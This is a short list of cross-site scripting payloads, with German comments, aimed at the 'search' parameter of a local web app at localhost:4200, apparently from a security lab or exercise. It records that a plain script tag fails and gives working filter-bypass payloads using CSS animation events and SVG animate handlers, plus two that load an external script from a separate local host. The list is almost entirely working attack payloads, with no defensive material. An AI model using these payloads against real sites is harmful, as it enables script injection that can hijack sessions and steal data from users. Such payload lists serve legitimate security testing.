# Not working
http://localhost:4200/?search=<script>alert(1)</script>

# Working in Firefox und Chrome
http://localhost:4200/?search=<style>@keyframes x{}</style><xss style="animation-name:x" onanimationend="alert(1)"></xss>
http://localhost:4200/?search=<style>@keyframes x{}</style><xss style="animation-name:x" onanimationstart="alert(1)"></xss>
http://localhost:4200/?search=<svg><animate onbegin=alert(1)>
http://localhost:4200/?search=<svg><animate onend=alert(1) dur=1s>

# LÃ¤dt externes Skript
http://localhost:4200/?search=<style>@keyframes x{}</style><xss style="animation-name:x" onanimationend="s=document.createElement('script');s.src='http://localhost:9999/attack.js';document.body.appendChild(s);"></xss>
http://localhost:4200/?search=<svg><animate onbegin="s=document.createElement('script');s.src='http://localhost:9999/attack.js';document.body.appendChild(s);">
